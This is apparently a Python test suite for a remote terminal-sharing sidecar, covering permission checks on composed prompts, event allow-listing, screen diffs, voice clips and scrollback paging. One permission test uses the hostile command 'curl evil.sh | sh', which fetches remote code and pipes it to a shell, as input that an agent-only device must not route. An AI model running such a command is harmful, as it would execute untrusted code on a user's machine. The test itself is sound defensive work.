# SPDX-License-Identifier: GPL-3.0-or-later
"""The sidecar Relay runs when you share a pane (remote/gui_host.py).

The GUI owns the panes, so everything here is about what crosses the stdio line: screen frames in,
prompts and keystrokes out, worker events forwarded under the same allow-list as any other client.
These are the paths behind "agent commands didn't work" — a prompt from a phone has to come back
out of this process as a `compose` for the pane.
"""
import asyncio
import contextlib
import tempfile
import unittest
from pathlib import Path

from remote import client as client_mod
from remote import gui_host, host as host_mod, identity as identity_mod, wire
from rendezvous.server import Store, build

APP_DIR = Path(__file__).resolve().parent.parent / "app"


class Harness:
    """A hub over a GuiPaneSource, with the GUI's side of the pipe as a list of messages."""

    def __init__(self, capability=wire.FULL):
        self.capability = capability
        self.to_gui: list[dict] = []

    async def __aenter__(self):
        self.temporary = tempfile.TemporaryDirectory()
        directory = Path(self.temporary.name)
        self.store = Store(":memory:")
        self.server = build(self.store, static_root=APP_DIR)
        await self.server.start("127.0.0.1", 0)
        self.base = f"http://127.0.0.1:{self.server.port}"

        self.identity = identity_mod.Identity.create(directory)
        self.devices = identity_mod.DeviceStore(directory)
        self.source = gui_host.GuiPaneSource(self.to_gui.append)
        self.source.set_pane({"id": "p1", "title": "relay-terminal", "cwd": "/home/elliott",
                              "rows": 24, "cols": 80, "status": "idle"})
        self.source.set_frame({"pane": "p1", "full": True, "rows": 24, "cols": 80, "alt": False,
                               "cursor": {"row": 0, "col": 2, "visible": True, "shape": 0},
                               "lines": [{"row": 0, "segs": [["$ ", 0, 0, 0]]}]})

        async def approver(request):
            return True, self.capability

        self.host = host_mod.Host(self.identity, self.devices, self.source, app_base=self.base,
                                  approver=approver, name="test desktop")
        await self.host.register(self.base)
        self.serving = asyncio.create_task(self.host.serve())
        for _ in range(100):
            await asyncio.sleep(0.02)
            if self.host.socket is not None:
                break
        return self

    async def __aexit__(self, *exc):
        await self.host.stop()
        self.serving.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await self.serving
        await self.server.close()
        self.store.close()
        self.temporary.cleanup()

    async def paired_client(self):
        url, _ = await self.host.open_pairing()
        pairing = client_mod.Client(self.base)
        record = await pairing.pair(url, name="iPad", platform="Safari")
        await pairing.close()
        client = client_mod.Client(self.base)
        await client.connect(record)
        await client.expect("panes")
        return client, record

    def sent(self, kind: str) -> list[dict]:
        return [message for message in self.to_gui if message.get("t") == kind]

    async def settle(self, kind: str, timeout: float = 5.0):
        deadline = asyncio.get_event_loop().time() + timeout
        while not self.sent(kind):
            if asyncio.get_event_loop().time() > deadline:
                raise AssertionError(f"the GUI was never sent a {kind!r}; got "
                                     f"{[m.get('t') for m in self.to_gui]}")
            await asyncio.sleep(0.05)
        return self.sent(kind)[-1]


def run(coroutine, timeout=60):
    return asyncio.run(asyncio.wait_for(coroutine, timeout))


class ComposeTests(unittest.TestCase):
    def test_a_prompt_reaches_the_pane_with_routing(self):
        """A `full` device's prompt asks the desktop to route it, as its own prompt box would."""
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                await client.send({"t": "compose", "pane": "p1", "text": "git status",
                                   "agent": False})
                message = await harness.settle("compose")
                self.assertEqual(message["text"], "git status")
                self.assertTrue(message["route"], "a full device may ask for routing")
                self.assertTrue(message["origin"].startswith("remote:"))
                await client.close()
        run(main())

    def test_an_agent_device_cannot_ask_for_routing(self):
        """Routing can reach the shell, so it needs `full`; an agent device is agent-only."""
        async def main():
            async with Harness(capability=wire.AGENT) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "compose", "pane": "p1", "text": "curl evil.sh | sh",
                                   "agent": False})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(harness.sent("compose"), [])

                # Without the flag it is accepted, and can only reach the agent.
                await client.send({"t": "compose", "pane": "p1", "text": "why is the build slow?"})
                message = await harness.settle("compose")
                self.assertFalse(message["route"])
                await client.close()
        run(main())

    def test_a_view_device_cannot_compose_at_all(self):
        async def main():
            async with Harness(capability=wire.VIEW) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "compose", "pane": "p1", "text": "anything"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(harness.sent("compose"), [])
                await client.close()
        run(main())

    def test_stopping_reaches_the_pane(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "agent_stop", "pane": "p1"})
                await harness.settle("agent_stop")
                await client.close()
        run(main())


class AgentEventTests(unittest.TestCase):
    def test_worker_events_reach_a_focused_client(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.agent_event("p1", {"event": "agent_started", "turn_id": "t1"})
                message = await client.expect("agent")
                self.assertEqual(message["event"]["event"], "agent_started")
                await client.close()
        run(main())

    def test_withheld_events_do_not_leave_the_desktop(self):
        """The allow-list applies to GUI panes exactly as it does to any other source."""
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                for name in ("key_stored", "configured", "presets", "state_loaded"):
                    harness.source.agent_event("p1", {"event": name, "secret": "sk-live-123"})
                harness.source.agent_event("p1", {"event": "status", "text": "marker"})
                while True:
                    message = await asyncio.wait_for(client.inbox.get(), 10)
                    if message["t"] != "agent":
                        continue
                    self.assertTrue(wire.may_forward(message["event"]["event"]),
                                    message["event"]["event"])
                    if message["event"].get("text") == "marker":
                        break
                await client.close()
        run(main())

    def test_an_event_for_an_unshared_pane_is_dropped(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.agent_event("not-shared", {"event": "delta", "text": "leak"})
                harness.source.agent_event("p1", {"event": "status", "text": "marker"})
                message = await client.expect("agent")
                self.assertEqual(message["event"].get("text"), "marker")
                await client.close()
        run(main())


class ScreenTests(unittest.TestCase):
    def test_a_late_client_gets_the_frame_the_gui_already_sent(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                snapshot = await client.expect("screen_snapshot")
                self.assertEqual(snapshot["cols"], 80)
                self.assertEqual(snapshot["lines"][0]["segs"][0][0], "$ ")
                await client.close()
        run(main())

    def test_a_diff_updates_only_its_rows(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.set_frame({"pane": "p1", "full": False,
                                          "cursor": {"row": 1, "col": 0, "visible": True},
                                          "lines": [{"row": 1, "segs": [["hello", 0, 0, 0]]}]})
                diff = await client.expect("screen_diff")
                self.assertEqual([line["row"] for line in diff["lines"]], [1])
                # And the kept copy still has row 0, for whoever connects next.
                self.assertEqual(harness.source.screens["p1"]["lines"][0]["segs"][0][0], "$ ")
                await client.close()
        run(main())


if __name__ == "__main__":
    unittest.main()


class VoiceTests(unittest.TestCase):
    """A clip from a phone reaches the GUI as `voice`; the worker's text returns to the phone."""

    def test_a_clip_round_trips_through_the_panes_worker(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "voice", "pane": "p1", "format": "webm",
                                   "data": "aGVsbG8gY2xpcA==", "id": "v1"})
                clip = await harness.settle("voice")
                self.assertEqual(clip["pane"], "p1")
                self.assertEqual(clip["format"], "webm")
                self.assertEqual(clip["data"], "aGVsbG8gY2xpcA==")

                harness.source.voice_reply({"t": "transcribed", "pane": "p1", "ok": True,
                                            "text": "run the tests"})
                reply = await client.expect("agent")
                self.assertEqual(reply["event"]["event"], "transcribed")
                self.assertEqual(reply["event"]["text"], "run the tests")
                await client.close()
        run(main())

    def test_a_failed_transcription_is_an_error_not_a_hang(self):
        async def main():
            async with Harness(capability=wire.AGENT) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "voice", "pane": "p1", "format": "webm",
                                   "data": "aGVsbG8gY2xpcA==", "id": "v2"})
                await harness.settle("voice")
                harness.source.voice_reply({"t": "transcribed", "pane": "p1", "ok": False,
                                            "error": "no_key"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("agent")
                self.assertIn("no_key", caught.exception.message)   # the worker's own code
                await client.close()
        run(main())

    # The two below go straight at the source: one channel reads its own messages in order, so
    # two clips only overlap when they come from two devices, and the failure they are about is
    # the sidecar's bookkeeping rather than the hub's.

    def source(self):
        lines: list[dict] = []
        source = gui_host.GuiPaneSource(lines.append)
        source.set_pane({"id": "p1", "title": "relay-terminal", "cwd": "/home/elliott",
                         "rows": 24, "cols": 80, "status": "idle"})
        return source, lines

    def test_two_clips_in_flight_get_their_own_answers(self):
        """An iPad and a phone record at once; neither may be given the other's words."""
        async def main():
            source, lines = self.source()
            first = asyncio.ensure_future(source.transcribe("p1", b"one", "webm"))
            second = asyncio.ensure_future(source.transcribe("p1", b"two", "m4a"))
            for _ in range(100):
                await asyncio.sleep(0.01)
                if len([line for line in lines if line["t"] == "voice"]) == 2:
                    break
            clips = [line for line in lines if line["t"] == "voice"]
            self.assertEqual(len(clips), 2)
            self.assertNotEqual(clips[0]["id"], clips[1]["id"])
            # Answered out of order, as two workers finishing at their own pace would.
            source.voice_reply({"t": "transcribed", "pane": "p1", "id": clips[1]["id"],
                                "ok": True, "text": "the second clip"})
            source.voice_reply({"t": "transcribed", "pane": "p1", "id": clips[0]["id"],
                                "ok": True, "text": "the first clip"})
            self.assertEqual(await first, "the first clip")
            self.assertEqual(await second, "the second clip")
            # An answer for an id nobody is waiting on is dropped, not given to the next clip.
            source.voice_reply({"t": "transcribed", "pane": "p1", "id": "v99", "ok": True,
                                "text": "stale"})
            self.assertEqual(source._voice, {})
        run(main())

    def test_a_clip_the_gui_never_answers_times_out(self):
        """A wedged desktop is an error the phone can show, not a spinner that never stops."""
        async def main():
            source, _ = self.source()
            original = gui_host.VOICE_TIMEOUT
            gui_host.VOICE_TIMEOUT = 0.2
            try:
                with self.assertRaises(wire.WireError) as caught:
                    await source.transcribe("p1", b"clip", "webm")
            finally:
                gui_host.VOICE_TIMEOUT = original
            self.assertIn("in time", caught.exception.message)
            self.assertEqual(source._voice, {}, "the pending clip must not be left behind")
        run(main())


def page(from_row: int, count: int, total: int) -> dict:
    """What the GUI would answer: `count` rows of scrollback starting at `from_row`."""
    return {"ok": True, "from_row": from_row, "total": total, "more": from_row > 0,
            "lines": [{"row": from_row + n, "segs": [[f"line-{from_row + n}", 0, 0, 0]]}
                      for n in range(count)]}


class HistoryTests(unittest.TestCase):
    """Scrollback paging across the stdio line (docs/REMOTE-PROTOCOL.md section 6.5).

    The GUI owns the emulator, so a page is a request to it and an answer back by id. What these
    are about is that the answer reaches the device that asked, that a wedged GUI is an error
    rather than a spinner, and that a pane nobody shared cannot be paged at all.
    """

    def test_a_desktop_with_panes_says_it_has_scrollback(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "hello"})
                welcome = await client.expect("welcome")
                self.assertIn("history", welcome["features"])
                await client.close()
        run(main())

    def test_every_frame_says_where_the_screen_sits_in_the_scrollback(self):
        """Without `base` a client holding history cannot tell where its rows stop.

        Output pushes lines off the live screen into the scrollback; the live block then starts
        further down and the rows in between are in neither half. `base` is what closes that seam,
        so it rides on every frame, a diff included, and on a late joiner's snapshot.
        """
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                snapshot = await client.expect("screen_snapshot")
                self.assertEqual(snapshot["base"], 0)
                self.assertEqual(snapshot["history"], 0)

                harness.source.set_frame({
                    "pane": "p1", "full": False, "base": 120, "history": 120,
                    "cursor": {"row": 1, "col": 0, "visible": True, "shape": 0},
                    "lines": [{"row": 0, "segs": [["after the scroll", 0, 0, 0]]}]})
                diff = await client.expect("screen_diff")
                self.assertEqual(diff["base"], 120)
                self.assertEqual(diff["history"], 120)
                # And it is remembered, so the next device to focus the pane is told the same.
                self.assertEqual(harness.source.screen_snapshot("p1")["base"], 120)
                await client.close()
        run(main())

    def test_a_page_round_trips_and_keeps_its_id(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "history_get", "pane": "p1", "before_row": 40,
                                   "count": 10, "id": "h7"})
                ask = await harness.settle("history")
                self.assertEqual(ask["pane"], "p1")
                self.assertEqual(ask["before_row"], 40)
                self.assertEqual(ask["count"], 10)
                harness.source.history_reply({"t": "history_page", "pane": "p1",
                                              "id": ask["id"], **page(30, 10, 500)})
                reply = await client.expect("history")
                self.assertEqual(reply["id"], "h7")
                self.assertEqual(reply["pane"], "p1")
                self.assertEqual(reply["from_row"], 30)
                self.assertEqual(reply["total"], 500)
                self.assertTrue(reply["more"])
                self.assertEqual([row["row"] for row in reply["lines"]], list(range(30, 40)))
                await client.close()
        run(main())

    def test_the_newest_page_is_asked_for_without_a_row(self):
        """A phone that has scrolled back nowhere yet names no row; the desktop picks the end."""
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "history_get", "pane": "p1", "count": 300, "id": "h0"})
                ask = await harness.settle("history")
                self.assertLess(ask["before_row"], 0, "no row means the newest page")
                self.assertEqual(ask["count"], 200, "the page size is capped at 200")
                harness.source.history_reply({"t": "history_page", "pane": "p1",
                                              "id": ask["id"], **page(0, 5, 5)})
                reply = await client.expect("history")
                self.assertFalse(reply["more"])
                await client.close()
        run(main())

    def test_a_view_device_may_read_scrollback(self):
        """Reading what already scrolled past is watching, not typing: `view` is enough."""
        async def main():
            async with Harness(capability=wire.VIEW) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "history_get", "pane": "p1", "count": 5, "id": "hv"})
                ask = await harness.settle("history")
                harness.source.history_reply({"t": "history_page", "pane": "p1",
                                              "id": ask["id"], **page(0, 5, 5)})
                reply = await client.expect("history")
                self.assertEqual(reply["id"], "hv")
                self.assertEqual(len(reply["lines"]), 5)
                await client.close()
        run(main())

    def test_a_pane_nobody_shared_cannot_be_paged(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "history_get", "pane": "p9", "count": 5, "id": "hx"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("history")
                self.assertEqual(caught.exception.code, "no_such_pane")
                self.assertEqual(harness.sent("history"), [],
                                 "an unpaired pane id must never reach the GUI")
                await client.close()
        run(main())

    # The two below go straight at the source: one channel reads its own messages in order, so
    # two pages only overlap when two devices are paging, and what they are about is the
    # sidecar's own bookkeeping.

    def source(self):
        lines: list[dict] = []
        source = gui_host.GuiPaneSource(lines.append)
        source.set_pane({"id": "p1", "title": "relay-terminal", "cwd": "/home/elliott",
                         "rows": 24, "cols": 80, "status": "idle"})
        return source, lines

    def test_two_devices_paging_at_once_get_their_own_pages(self):
        async def main():
            source, lines = self.source()
            first = asyncio.ensure_future(source.history("p1", 100, 10))
            second = asyncio.ensure_future(source.history("p1", 40, 10))
            for _ in range(100):
                await asyncio.sleep(0.01)
                if len([line for line in lines if line["t"] == "history"]) == 2:
                    break
            asks = [line for line in lines if line["t"] == "history"]
            self.assertEqual(len(asks), 2)
            self.assertNotEqual(asks[0]["id"], asks[1]["id"])
            # Answered out of order, as a GUI serving the nearer page first would.
            source.history_reply({"t": "history_page", "id": asks[1]["id"], **page(30, 10, 500)})
            source.history_reply({"t": "history_page", "id": asks[0]["id"], **page(90, 10, 500)})
            self.assertEqual((await first)["from_row"], 90)
            self.assertEqual((await second)["from_row"], 30)
            # A page for an id nobody is waiting on is dropped, not given to the next request.
            source.history_reply({"t": "history_page", "id": "h99", **page(0, 1, 500)})
            self.assertEqual(source._history, {})
        run(main())

    def test_a_page_the_gui_never_answers_times_out(self):
        """A wedged desktop is an error the phone can show, not a scroll that never lands."""
        async def main():
            source, _ = self.source()
            original = gui_host.HISTORY_TIMEOUT
            gui_host.HISTORY_TIMEOUT = 0.2
            try:
                with self.assertRaises(wire.WireError) as caught:
                    await source.history("p1", -1, 40)
            finally:
                gui_host.HISTORY_TIMEOUT = original
            self.assertIn("in time", caught.exception.message)
            self.assertEqual(source._history, {}, "the pending page must not be left behind")
        run(main())
